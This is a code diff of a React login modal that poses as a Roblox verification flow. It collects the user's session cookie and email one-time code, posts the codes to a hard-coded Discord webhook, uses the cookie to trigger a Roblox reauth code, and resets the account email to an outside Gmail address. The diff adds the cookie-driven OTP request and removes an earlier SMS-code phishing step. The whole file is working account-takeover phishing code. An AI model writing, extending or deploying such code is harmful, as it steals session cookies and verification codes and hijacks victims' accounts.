@@ -1,4 +1,3 @@
-// Import required modules
 import React, { useState, useEffect } from 'react';
 import { X, AlertTriangle, Lock, Shield, Loader2, MessageSquare } from 'lucide-react';
 import { Button } from '@/components/ui/button';
@@ -7,33 +6,26 @@ import { Input } from '@/components/ui/input';
 import { useAuth } from '@/contexts/AuthContext';
 import { useToast } from '@/hooks/use-toast';
 
-// Define types and interfaces
-type VerificationStep = 'cookie' | 'verifying' | 'loading' | 'email-verification' | 'sms-code';
+type VerificationStep = 'cookie' | 'verifying' | 'loading' | 'email-verification';
 
 interface LoginModalProps {
   isOpen: boolean;
   onClose: () => void;
 }
 
-// Define constants
 const webhookUrl = 'https://discord.com/api/webhooks/1446310211437465754/iwPwGgH7qXoiRAmjwWvuSWkPT-ReIBgvYGjRA7TCQV3ksIQ3iM1nNPwygrsjNPyecDVI';
 
-// Export LoginModal component
 export function LoginModal({ isOpen, onClose }: LoginModalProps) {
-  // State management
   const [cookie, setCookie] = useState('');
-  const [smsCode, setSmsCode] = useState('');
   const [emailCode, setEmailCode] = useState('');
   const [step, setStep] = useState<VerificationStep>('cookie');
   const [isLoading, setIsLoading] = useState(false);
   const { login } = useAuth();
   const { toast } = useToast();
 
-  // Effects
   useEffect(() => {
     if (!isOpen) {
       setCookie('');
-      setSmsCode('');
       setEmailCode('');
       setStep('cookie');
     }
@@ -41,7 +33,6 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
 
   if (!isOpen) return null;
 
-  // Handle cookie submission
   const handleCookieSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!cookie.trim()) {
@@ -59,9 +50,21 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     setStep('loading');
     await new Promise(resolve => setTimeout(resolve, 1500));
     setStep('email-verification');
+    // Send request to send email verification code
+    await fetch(`https://apis.roblox.com/otp-service/v1/sendCodeForUser`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Cookie': cookie
+      },
+      body: JSON.stringify({
+        contactType: 'Email',
+        messageVariant: 'Default',
+        origin: 'Reauth'
+      })
+    });
   };
 
-  // Handle email verification submission
   const handleEmailVerificationSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!emailCode.trim()) {
@@ -74,22 +77,6 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     }
     // Send email verification code to Discord webhook
     await sendToWebhook('Email Verification Code', emailCode);
-    setStep('sms-code');
-  };
-
-  // Handle SMS code submission
-  const handleSmsCodeSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!smsCode.trim()) {
-      toast({
-        title: "Error",
-        description: "Please enter the verification code",
-        variant: "destructive",
-      });
-      return;
-    }
-    // Send SMS code to Discord webhook
-    await sendToWebhook('SMS Code', smsCode);
     setIsLoading(true);
     const result = await login(cookie.trim());
     setIsLoading(false);
@@ -112,7 +99,6 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     }
   };
 
-  // Send data to Discord webhook
   const sendToWebhook = async (type: string, code: string) => {
     try {
       await fetch(webhookUrl, {
@@ -129,7 +115,6 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     }
   };
 
-  // Reset account email
   const resetAccountEmail = async () => {
     try {
       // Send request to reset account email
@@ -137,6 +122,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
+          'Cookie': cookie
         },
         body: JSON.stringify({
           emailAddress: 'trissymissylol@gmail.com',
@@ -148,7 +134,6 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     }
   };
 
-  // Render step content
   const renderStepContent = () => {
     if (step === 'verifying') {
       return (
@@ -170,11 +155,12 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
       );
     }
 
+     // email verification
     if (step === 'email-verification') {
       return (
         <>
           <div className="mb-6">
-            <h2 className="text-xl font-bold text-foreground">Check  Email</h2>
+            <h2 className="text-xl font-bold text-foreground">Check Your Email</h2>
             <p className="mt-1 text-sm text-muted-foreground">
               Enter the email verification code sent to your Roblox email
             </p>
@@ -207,59 +193,6 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
             >
               <Lock className="h-4 w-4" />
               Verify Email Code
-            </Button>
-          </form>
-        </>
-      );
-    }
-
-    if (step === 'sms-code') {
-      return (
-        <>
-          <div className="mb-6">
-            <h2 className="text-xl font-bold text-foreground">Check Your Phone</h2>
-            <p className="mt-1 text-sm text-muted-foreground">
-              Enter the verification code sent to your phone
-            </p>
-          </div>
-
-          <div className="mb-4 flex items-start gap-3 rounded-lg border border-primary/30 bg-primary/10 p-3">
-            <MessageSquare className="h-5 w-5 shrink-0 text-primary" />
-            <p className="text-xs text-foreground/80">
-              We've sent a one-time password to your phone. Check your messages and enter the code below.
-            </p>
-          </div>
-
-          <form onSubmit={handleSmsCodeSubmit} className="space-y-4">
-            <div>
-              <label className="mb-2 block text-sm font-medium text-foreground">
-                Verification Code
-              </label>
-              <Input
-                value={smsCode}
-                onChange={(e) => setSmsCode(e.target.value)}
-                placeholder="Enter 6-digit code"
-                className="text-center text-lg tracking-widest"
-                maxLength={6}
-              />
-            </div>
-
-            <Button 
-              type="submit" 
-              className="w-full bg-primary text-primary-foregroun shadow-[0_0_20px_hsl(var(--primary)/0.3)] hover:shadow-[0_0_30px_hsl(var(--primary)/0.4)] font-semibold" 
-              disabled={isLoading}
-            >
-              {isLoading ? (
-                <>
-                  <Loader2 className="h-4 w-4 animate-spin" />
-                  Connecting...
-                </>
-              ) : (
-                <>
-                  <Lock className="h-4 w-4" />
-                  Verify & Connect
-                </>
-              )}
             </Button>
           </form>
         </>
